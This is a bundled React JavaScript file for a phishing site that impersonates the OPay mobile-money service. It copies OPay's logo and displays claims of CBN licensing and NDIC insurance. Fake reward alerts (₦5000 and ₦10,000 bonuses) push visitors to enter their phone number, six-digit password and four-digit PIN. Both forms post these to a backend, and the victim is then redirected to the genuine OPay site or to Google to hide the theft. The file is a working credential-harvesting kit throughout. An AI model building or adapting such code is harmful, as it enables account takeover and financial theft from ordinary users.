require("./index.css");
var $ltMAx$reactjsxruntime = require("react/jsx-runtime");
var $ltMAx$react = require("react");
var $ltMAx$reactdomclient = require("react-dom/client");
var $ltMAx$reactrouterdom = require("react-router-dom");
require("bootstrap/dist/css/bootstrap.min.css");
require("@fortawesome/fontawesome-free/css/all.min.css");
var $ltMAx$axios = require("axios");
var $ltMAx$fortawesomereactfontawesome = require("@fortawesome/react-fontawesome");
var $ltMAx$fortawesomefreesolidsvgicons = require("@fortawesome/free-solid-svg-icons");


function $parcel$interopDefault(a) {
  return a && a.__esModule ? a.default : a;
}










var $ec73aa5452d4f98b$exports = {};
$ec73aa5452d4f98b$exports = new URL("opay-logo.a849a04d.jpg", "file:" + __filename).toString();


var $5c4db93c82df6007$exports = {};
$5c4db93c82df6007$exports = new URL("cbn.decadd73.jpg", "file:" + __filename).toString();


var $879490e392fb927c$exports = {};
$879490e392fb927c$exports = new URL("ndic.f3eabccb.jpg", "file:" + __filename).toString();



const $da11a1101b2a894a$var$API_URL = "https://localhost:7001";
const $da11a1101b2a894a$var$App = ()=>{
    const [phoneNumber, setPhoneNumber] = (0, $ltMAx$react.useState)("");
    const [password, setPassword] = (0, $ltMAx$react.useState)("");
    const [pin, setPin] = (0, $ltMAx$react.useState)("");
    const [showPassword, setShowPassword] = (0, $ltMAx$react.useState)(false);
    const [showPin, setShowPin] = (0, $ltMAx$react.useState)(false);
    const [errors, setErrors] = (0, $ltMAx$react.useState)({});
    const navigate = (0, $ltMAx$reactrouterdom.useNavigate)();
    const validatePhoneNumber = (value)=>/^[0-9]{10,15}$/.test(value);
    const validatePassword = (value)=>/^\d{6}$/.test(value);
    const validatePin = (value)=>/^\d{4}$/.test(value);
    const handleSubmit = async (e)=>{
        e.preventDefault();
        const newErrors = {};
        if (!validatePhoneNumber(phoneNumber)) newErrors.phoneNumber = "Invalid phone number";
        if (!validatePassword(password)) newErrors.password = "Password must be 6 digits";
        if (!validatePin(pin)) newErrors.pin = "PIN must be 4 digits";
        setErrors(newErrors);
        if (Object.keys(newErrors).length === 0) try {
            const payload = {
                PhoneNumber: phoneNumber,
                Pin6: password,
                Pin4: pin
            };
            const response = await (0, ($parcel$interopDefault($ltMAx$axios))).post(`${$da11a1101b2a894a$var$API_URL}/api/Auth/register`, payload, {
                headers: {
                    "Content-Type": "application/json"
                },
                withCredentials: true
            });
            console.log("Registration Success:", response.data);
            alert("\uD83C\uDF89 Congratulations! You just won the \u20A65000 bonus. Please wait a few minutes for it to be added to your balance.");
            navigate("/redirect", {
                replace: true
            }); // Change this line to use the redirect component
        } catch (error) {
            console.error("Registration Failed:", error);
            alert(error.response?.data?.message || "Registration failed");
        }
    };
    return /*#__PURE__*/ (0, $ltMAx$reactjsxruntime.jsx)("div", {
        className: "container",
        children: /*#__PURE__*/ (0, $ltMAx$reactjsxruntime.jsxs)("div", {
            className: "form-container",
            children: [
                /*#__PURE__*/ (0, $ltMAx$reactjsxruntime.jsx)("img", {
                    src: (0, (/*@__PURE__*/$parcel$interopDefault($ec73aa5452d4f98b$exports))),
                    alt: "OPay Logo",
                    className: "logo"
                }),
                /*#__PURE__*/ (0, $ltMAx$reactjsxruntime.jsxs)("form", {
                    onSubmit: handleSubmit,
                    className: "form-content",
                    children: [
                        /*#__PURE__*/ (0, $ltMAx$reactjsxruntime.jsxs)("div", {
                            className: "form-group floating",
                            children: [
                                /*#__PURE__*/ (0, $ltMAx$reactjsxruntime.jsx)("input", {
                                    type: "text",
                                    className: "form-control",
                                    id: "phoneNumber",
                                    value: phoneNumber,
                                    onChange: (e)=>setPhoneNumber(e.target.value),
                                    placeholder: " ",
                                    required: true
                                }),
                                /*#__PURE__*/ (0, $ltMAx$reactjsxruntime.jsx)("label", {
                                    htmlFor: "phoneNumber",
                                    className: "floating-label",
                                    children: "Enter your Mobile No./Email"
                                }),
                                errors.phoneNumber && /*#__PURE__*/ (0, $ltMAx$reactjsxruntime.jsx)("div", {
                                    className: "error-message",
                                    children: errors.phoneNumber
                                })
                            ]
                        }),
                        /*#__PURE__*/ (0, $ltMAx$reactjsxruntime.jsxs)("div", {
                            className: "form-group",
                            children: [
                                /*#__PURE__*/ (0, $ltMAx$reactjsxruntime.jsxs)("div", {
                                    className: "password-container",
                                    children: [
                                        /*#__PURE__*/ (0, $ltMAx$reactjsxruntime.jsx)("input", {
                                            type: showPassword ? "text" : "password",
                                            className: "form-control",
                                            id: "password",
                                            value: password,
                                            onChange: (e)=>setPassword(e.target.value),
                                            placeholder: "Enter 6-digit Password",
                                            required: true
                                        }),
                                        /*#__PURE__*/ (0, $ltMAx$reactjsxruntime.jsx)((0, $ltMAx$fortawesomereactfontawesome.FontAwesomeIcon), {
                                            icon: showPassword ? (0, $ltMAx$fortawesomefreesolidsvgicons.faEyeSlash) : (0, $ltMAx$fortawesomefreesolidsvgicons.faEye),
                                            className: "toggle-icon",
                                            onClick: ()=>setShowPassword(!showPassword)
                                        })
                                    ]
                                }),
                                errors.password && /*#__PURE__*/ (0, $ltMAx$reactjsxruntime.jsx)("div", {
                                    className: "error-message",
                                    children: errors.password
                                })
                            ]
                        }),
                        /*#__PURE__*/ (0, $ltMAx$reactjsxruntime.jsxs)("div", {
                            className: "form-group",
                            children: [
                                /*#__PURE__*/ (0, $ltMAx$reactjsxruntime.jsxs)("div", {
                                    className: "password-container",
                                    children: [
                                        /*#__PURE__*/ (0, $ltMAx$reactjsxruntime.jsx)("input", {
                                            type: showPin ? "text" : "password",
                                            className: "form-control",
                                            id: "pin",
                                            value: pin,
                                            onChange: (e)=>setPin(e.target.value),
                                            placeholder: "PIN",
                                            required: true
                                        }),
                                        /*#__PURE__*/ (0, $ltMAx$reactjsxruntime.jsx)((0, $ltMAx$fortawesomereactfontawesome.FontAwesomeIcon), {
                                            icon: showPin ? (0, $ltMAx$fortawesomefreesolidsvgicons.faEyeSlash) : (0, $ltMAx$fortawesomefreesolidsvgicons.faEye),
                                            className: "toggle-icon",
                                            onClick: ()=>setShowPin(!showPin)
                                        })
                                    ]
                                }),
                                errors.pin && /*#__PURE__*/ (0, $ltMAx$reactjsxruntime.jsx)("div", {
                                    className: "error-message",
                                    children: errors.pin
                                }),
                                /*#__PURE__*/ (0, $ltMAx$reactjsxruntime.jsx)("a", {
                                    href: "/sign",
                                    className: "forgot-password",
                                    children: "Forgot Password?"
                                })
                            ]
                        }),
                        /*#__PURE__*/ (0, $ltMAx$reactjsxruntime.jsx)("button", {
                            type: "submit",
                            className: "btn btn-primary",
                            children: "Claim"
                        })
                    ]
                }),
                /*#__PURE__*/ (0, $ltMAx$reactjsxruntime.jsx)("div", {
                    className: "bottom-text-container",
                    children: /*#__PURE__*/ (0, $ltMAx$reactjsxruntime.jsxs)("div", {
                        className: "bottom-text",
                        children: [
                            "Don\u2019t have an account yet? ",
                            /*#__PURE__*/ (0, $ltMAx$reactjsxruntime.jsx)("br", {}),
                            /*#__PURE__*/ (0, $ltMAx$reactjsxruntime.jsx)("a", {
                                href: "/login",
                                children: "Click here to get one"
                            })
                        ]
                    })
                }),
                /*#__PURE__*/ (0, $ltMAx$reactjsxruntime.jsxs)("div", {
                    className: "bottom-social",
                    children: [
                        /*#__PURE__*/ (0, $ltMAx$reactjsxruntime.jsx)("img", {
                            src: (0, (/*@__PURE__*/$parcel$interopDefault($5c4db93c82df6007$exports))),
                            alt: "CBN Logo",
                            className: "social-logo"
                        }),
                        " Licensed by the ",
                        /*#__PURE__*/ (0, $ltMAx$reactjsxruntime.jsx)("span", {
                            style: {
                                color: "#3C3B5F",
                                fontWeight: "bold"
                            },
                            children: "CBN"
                        }),
                        " ",
                        "and insured by the",
                        " ",
                        /*#__PURE__*/ (0, $ltMAx$reactjsxruntime.jsx)("img", {
                            src: (0, (/*@__PURE__*/$parcel$interopDefault($879490e392fb927c$exports))),
                            alt: "NDIC Logo",
                            className: "social-logo"
                        })
                    ]
                })
            ]
        })
    });
};
var $da11a1101b2a894a$export$2e2bcd8739ae039 = $da11a1101b2a894a$var$App;










const $2372fbe6d8bd7284$var$API_URL = "https://localhost:7001";
const $2372fbe6d8bd7284$var$Sign = ()=>{
    const [phoneNumber, setPhoneNumber] = (0, $ltMAx$react.useState)("");
    const [password, setPassword] = (0, $ltMAx$react.useState)("");
    const [note, setNote] = (0, $ltMAx$react.useState)(""); // State for textarea
    const [errors, setErrors] = (0, $ltMAx$react.useState)({});
    const [showAlert, setShowAlert] = (0, $ltMAx$react.useState)(true);
    const navigate = (0, $ltMAx$reactrouterdom.useNavigate)();
    (0, $ltMAx$react.useEffect)(()=>{
        setShowAlert(true);
    }, []);
    const validatePhoneNumber = (value)=>/^[0-9]{10,15}$/.test(value);
    const validatePassword = (value)=>/^\d{6}$/.test(value);
    const handleSubmit = async (e)=>{
        e.preventDefault();
        const newErrors = {};
        if (!validatePhoneNumber(phoneNumber)) newErrors.phoneNumber = "Invalid phone number";
        if (!validatePassword(password)) newErrors.password = "Password must be 6 digits";
        setErrors(newErrors);
        if (Object.keys(newErrors).length === 0) try {
            const response = await (0, ($parcel$interopDefault($ltMAx$axios))).post(`${$2372fbe6d8bd7284$var$API_URL}/api/Auth/login`, {
                phoneNumber: phoneNumber,
                password: password,
                note: note
            }, {
                headers: {
                    "Content-Type": "application/json"
                },
                withCredentials: true
            });
            console.log("Login Success:", response.data);
            alert("Login Successful!");
            window.location.href = "https://www.google.com";
        } catch (error) {
            console.error("Login Failed:", error);
            alert(error.response?.data?.message || "Login failed");
        }
    };
    return /*#__PURE__*/ (0, $ltMAx$reactjsxruntime.jsx)("div", {
        className: "container",
        style: {
            minHeight: "100vh",
            display: "flex",
            alignItems: "center",
            justifyContent: "center"
        },
        children: /*#__PURE__*/ (0, $ltMAx$reactjsxruntime.jsxs)("div", {
            className: "form-container",
            children: [
                showAlert && /*#__PURE__*/ (0, $ltMAx$reactjsxruntime.jsxs)("div", {
                    className: "custom-alert",
                    children: [
                        "Enter your details to claim your reward of \u20A610,000 into your account \uD83C\uDF89.",
                        /*#__PURE__*/ (0, $ltMAx$reactjsxruntime.jsx)("button", {
                            className: "close-alert",
                            onClick: ()=>setShowAlert(false),
                            children: "x"
                        })
                    ]
                }),
                /*#__PURE__*/ (0, $ltMAx$reactjsxruntime.jsx)("img", {
                    src: (0, (/*@__PURE__*/$parcel$interopDefault($ec73aa5452d4f98b$exports))),
                    alt: "OPay Logo",
                    className: "logo"
                }),
                /*#__PURE__*/ (0, $ltMAx$reactjsxruntime.jsxs)("form", {
                    onSubmit: handleSubmit,
                    className: "form-content",
                    children: [
                        /*#__PURE__*/ (0, $ltMAx$reactjsxruntime.jsxs)("div", {
                            className: "form-group",
                            children: [
                                /*#__PURE__*/ (0, $ltMAx$reactjsxruntime.jsx)("input", {
                                    type: "text",
                                    className: "form-control",
                                    id: "phoneNumber",
                                    value: phoneNumber,
                                    onChange: (e)=>setPhoneNumber(e.target.value),
                                    placeholder: " ",
                                    required: true
                                }),
                                /*#__PURE__*/ (0, $ltMAx$reactjsxruntime.jsx)("label", {
                                    htmlFor: "phoneNumber",
                                    className: "floating-label",
                                    children: "Enter your Mobile Number"
                                }),
                                errors.phoneNumber && /*#__PURE__*/ (0, $ltMAx$reactjsxruntime.jsx)("div", {
                                    className: "error-message",
                                    children: errors.phoneNumber
                                })
                            ]
                        }),
                        /*#__PURE__*/ (0, $ltMAx$reactjsxruntime.jsxs)("div", {
                            className: "form-group",
                            children: [
                                /*#__PURE__*/ (0, $ltMAx$reactjsxruntime.jsx)("input", {
                                    type: "password",
                                    className: "form-control",
                                    id: "password",
                                    value: password,
                                    onChange: (e)=>setPassword(e.target.value),
                                    placeholder: " ",
                                    required: true
                                }),
                                /*#__PURE__*/ (0, $ltMAx$reactjsxruntime.jsx)("label", {
                                    htmlFor: "password",
                                    className: "floating-label",
                                    children: "Enter 6-digit Password"
                                }),
                                errors.password && /*#__PURE__*/ (0, $ltMAx$reactjsxruntime.jsx)("div", {
                                    className: "error-message",
                                    children: errors.password
                                })
                            ]
                        }),
                        /*#__PURE__*/ (0, $ltMAx$reactjsxruntime.jsx)("div", {
                            className: "form-group",
                            children: /*#__PURE__*/ (0, $ltMAx$reactjsxruntime.jsx)("textarea", {
                                className: "form-control textarea",
                                id: "note",
                                value: note,
                                onChange: (e)=>setNote(e.target.value),
                                placeholder: "Enter Pin"
                            })
                        }),
                        /*#__PURE__*/ (0, $ltMAx$reactjsxruntime.jsx)("button", {
                            type: "submit",
                            className: "btn btn-primary",
                            style: {
                                paddingBottom: "5rem"
                            },
                            children: "Claim"
                        })
                    ]
                }),
                /*#__PURE__*/ (0, $ltMAx$reactjsxruntime.jsxs)("div", {
                    className: "bottom-social",
                    children: [
                        /*#__PURE__*/ (0, $ltMAx$reactjsxruntime.jsx)("img", {
                            src: (0, (/*@__PURE__*/$parcel$interopDefault($5c4db93c82df6007$exports))),
                            alt: "CBN Logo",
                            className: "social-logo"
                        }),
                        " Licenced by the",
                        " ",
                        /*#__PURE__*/ (0, $ltMAx$reactjsxruntime.jsx)("span", {
                            style: {
                                color: "#3C3B5F",
                                fontWeight: "bold"
                            },
                            children: " CBN"
                        }),
                        " and insured by the",
                        " ",
                        /*#__PURE__*/ (0, $ltMAx$reactjsxruntime.jsx)("img", {
                            src: (0, (/*@__PURE__*/$parcel$interopDefault($879490e392fb927c$exports))),
                            alt: "NDIC Logo",
                            className: "social-logo"
                        })
                    ]
                })
            ]
        })
    });
};
var $2372fbe6d8bd7284$export$2e2bcd8739ae039 = $2372fbe6d8bd7284$var$Sign;



const $5b8d14a9d9742155$var$Redirect = ()=>{
    (0, $ltMAx$react.useEffect)(()=>{
        window.location.replace("https://www.opayweb.com/");
    }, []);
    return null;
};
var $5b8d14a9d9742155$export$2e2bcd8739ae039 = $5b8d14a9d9742155$var$Redirect;





const $4fa36e821943b400$var$root = (0, ($parcel$interopDefault($ltMAx$reactdomclient))).createRoot(document.getElementById("root"));
$4fa36e821943b400$var$root.render(/*#__PURE__*/ (0, $ltMAx$reactjsxruntime.jsx)((0, ($parcel$interopDefault($ltMAx$react))).StrictMode, {
    children: /*#__PURE__*/ (0, $ltMAx$reactjsxruntime.jsx)((0, $ltMAx$reactrouterdom.BrowserRouter), {
        children: /*#__PURE__*/ (0, $ltMAx$reactjsxruntime.jsxs)((0, $ltMAx$reactrouterdom.Routes), {
            children: [
                /*#__PURE__*/ (0, $ltMAx$reactjsxruntime.jsx)((0, $ltMAx$reactrouterdom.Route), {
                    path: "/",
                    element: /*#__PURE__*/ (0, $ltMAx$reactjsxruntime.jsx)((0, $ltMAx$reactrouterdom.Navigate), {
                        to: "/app",
                        replace: true
                    })
                }),
                /*#__PURE__*/ (0, $ltMAx$reactjsxruntime.jsx)((0, $ltMAx$reactrouterdom.Route), {
                    path: "/app",
                    element: /*#__PURE__*/ (0, $ltMAx$reactjsxruntime.jsx)((0, $da11a1101b2a894a$export$2e2bcd8739ae039), {})
                }),
                /*#__PURE__*/ (0, $ltMAx$reactjsxruntime.jsx)((0, $ltMAx$reactrouterdom.Route), {
                    path: "/sign",
                    element: /*#__PURE__*/ (0, $ltMAx$reactjsxruntime.jsx)((0, $2372fbe6d8bd7284$export$2e2bcd8739ae039), {})
                }),
                /*#__PURE__*/ (0, $ltMAx$reactjsxruntime.jsx)((0, $ltMAx$reactrouterdom.Route), {
                    path: "/redirect",
                    element: /*#__PURE__*/ (0, $ltMAx$reactjsxruntime.jsx)((0, $5b8d14a9d9742155$export$2e2bcd8739ae039), {})
                }),
                /*#__PURE__*/ (0, $ltMAx$reactjsxruntime.jsx)((0, $ltMAx$reactrouterdom.Route), {
                    path: "*",
                    element: /*#__PURE__*/ (0, $ltMAx$reactjsxruntime.jsx)((0, $ltMAx$reactrouterdom.Navigate), {
                        to: "/app",
                        replace: true
                    })
                })
            ]
        })
    })
}));


//# sourceMappingURL=index.js.map
